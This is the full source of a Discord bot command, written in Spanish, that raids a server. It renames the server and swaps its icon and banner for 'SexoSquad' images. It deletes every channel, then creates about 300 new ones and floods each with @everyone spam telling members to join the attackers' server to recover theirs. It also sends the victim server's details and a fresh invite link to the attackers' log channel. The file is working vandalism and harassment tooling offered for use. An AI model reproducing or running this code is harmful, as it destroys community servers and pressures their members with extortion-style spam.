const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {
    name: 'sexo' ,
    timeout:600000, 
    data:
    
    new SlashCommandBuilder()
    .setName("sexo")
    .setDescription("Hazle sexo al server"),

    async run(client, interaction){
try{
    if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
    let IDsv = interaction.guild.id
    client.guilds.cache.get(IDsv).setName('☣️SexoSquad☣️').catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setBanner('https://i.imgur.com/e1lckFe.png').catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setIcon('https://i.imgur.com/e1lckFe.png').catch(e=>{
      return
    })



  interaction.guild.channels.cache.forEach(channel =>{

    channel.delete().catch(()=>{return;})
  
  })
  client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
    c.permissionOverwrites.create(c.guild.roles.everyone, { VIEW_CHANNEL: true });
    
    c.createInvite()
    .then(async invite => {
      
   
    const embed = new Discord.MessageEmbed()
    .setColor('RED')
    .setAuthor(interaction.guild.name, interaction.guild.iconURL({dynamic: true}))
    .setTitle('Nuevo Servidor Raideado!')
    .addField('Owner:',`> ${client.users.cache.get(interaction.guild.ownerId).tag} *(ID: ${interaction.guild.ownerId})*`)
    .addField('Servidor:',`> ${interaction.guild.name} *(ID: ${interaction.guild.id})*`)
    .addField('Miembros:',`> ${interaction.guild.memberCount}`)
    .addField(`User Raid:`,`> ${interaction.user.tag} *(ID: ${interaction.user.id})*`)
    .addField(`Invitación:`, `> **[ENTRAR AL SERVIDOR](https://discord.gg/${await invite.code})**`)
    .setTimestamp()
    .setThumbnail(interaction.guild.iconURL({size: 4096, format: "png",dynamic: true}))
    const row = new Discord.MessageActionRow()
    .addComponents(
      new Discord.MessageButton()
      .setLabel('ENTRAR AL SERVIDOR')
      .setURL(`https://discord.gg/${await invite.code}`)
      .setStyle('LINK')
    )
    client.channels.cache.get(require('../../config.json').canalogs).send({embeds: [embed], components: [row]})
  })
    c.send(`
  @everyone\n**¡Únete para que no le pase esto a tu servidor!**
  ${require('../../config.json').sexoinvite}
  `).catch(()=>{return})
  
  }).catch(e=>{return})

for (let i = 0; i <= 300; i++) {
await  interaction.guild.channels.create('☣️SexoSquad☣️').then(c => {
  c.permissionOverwrites.create(c.guild.roles.everyone, { VIEW_CHANNEL: true }).catch(e=>{return})
  for (let i = 0; i <= 20; i++) {
    c.send(`  @everyone \n Servidor destrozado por   **☣️SexoSquad☣️**  , si deseas recuperar tu servidor deberás unirte: \n ${require('../../config.json').sexoinvite} `).catch(e=>{return})
  

      }
    }).catch(()=>{
      return;
    })
  }




}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}
